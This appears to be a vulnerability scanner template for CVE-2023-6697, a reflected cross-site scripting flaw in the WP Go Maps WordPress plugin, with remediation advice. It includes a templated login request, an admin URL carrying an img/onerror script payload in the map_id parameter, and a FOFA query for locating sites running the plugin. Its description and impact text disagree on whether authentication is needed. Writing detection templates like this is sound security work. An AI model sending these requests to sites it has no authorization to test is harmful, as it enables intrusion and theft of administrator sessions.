http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <img src="x" onerror="alert(document.domain)">
    - Map Alignment</legend>
  - part: content_type
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/admin.php?page=wp-google-maps-menu&action=edit&map_id=1aa%27\"><img+src%3Dx+onerror%3Dalert%28document.domain%29>
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-6697
info:
  author: iamnoooob,ritikchaddha
  classification:
    cpe: cpe:2.3:a:wpgmaps:wp_go_maps:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-6697
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.97637
    epss-score: 0.48648
  description: 'The WP Go Maps (formerly WP Google Maps) plugin for WordPress is vulnerable
    to Reflected Cross-Site Scripting via the map id parameter in all versions up
    to, and including, 9.0.28 due to insufficient input sanitization and output escaping.
    This makes it possible for unauthenticated attackers to inject arbitrary web scripts
    in pages that execute if they can successfully trick a user into performing an
    action such as clicking on a link.

    '
  impact: 'Authenticated users can inject malicious JavaScript via reflected XSS in
    the map_id parameter, potentially stealing administrator session cookies or performing
    administrative actions.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/wp-google-maps"
    max-request: 2
    product: wp_go_maps
    vendor: wpgmaps
    verified: true
  name: WP Go Maps (formerly WP Google Maps) < 9.0.29 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/ffcebd9d-82fe-4a30-8ad6-cf6c03753d4c/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-6697
  remediation: 'Update WP Go Maps plugin to version 9.0.29 or later.

    '
  severity: medium
  tags: cve,cve2023,wp,wp-plugin,wordpress,xss,wp-go-maps,authenticated,vuln
